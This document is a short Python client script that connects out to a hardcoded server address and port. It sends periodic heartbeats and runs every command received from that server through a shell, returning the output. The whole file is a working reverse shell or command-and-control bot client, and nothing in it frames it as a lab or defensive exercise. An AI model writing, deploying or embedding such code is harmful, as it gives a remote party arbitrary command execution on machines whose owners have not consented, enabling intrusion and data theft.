import socket
import subprocess
import threading
import time

# Define the server IP and port the client should connect to
SERVER_IP = "10.4.25.214"  # Replace with the actual server IP
SERVER_PORT = 5001  # The port on which the server is listening

client_id = "Client_1"

def send_heartbeat(client_socket):
    while True:
        time.sleep(10)  # Send heartbeat every 10 seconds
        client_socket.send(b"HEARTBEAT")  # Send heartbeat message to the server
        print(f"[{client_id}] Heartbeat sent.")
        
def handle_connection(client_socket):
    while True:
        # Receive command from the server
        command = client_socket.recv(1024).decode('utf-8').strip()
        
        if command.lower() == 'exit':
            print("Closing connection.")
            client_socket.send(b"Connection closed.\n")
            client_socket.close()
            break
        
        try:
            # Execute the command and send back the result
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            client_socket.send(output)
        except subprocess.CalledProcessError as e:
            client_socket.send(f"Error executing command: {e}\n".encode('utf-8'))

def start_client_connection(server_ip, server_port):
    # The client will connect directly to the specified server IP and port
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client_socket.connect((server_ip, server_port))
        print(f"[{client_id}] Connected to server at {server_ip}:{server_port}")
    except socket.error as e:
        print(f"[{client_id}] Error connecting to server: {e}")
        return
    
    # Start heartbeat thread
    heartbeat_thread = threading.Thread(target=send_heartbeat, args=(client_socket,))
    heartbeat_thread.daemon = True  # Ensure this thread terminates when the main program ends
    heartbeat_thread.start()

    # Handle communication with the server
    handle_connection(client_socket)

if __name__ == "__main__":
    # Start the client and connect it to the predefined server IP
    start_client_connection(SERVER_IP, SERVER_PORT)
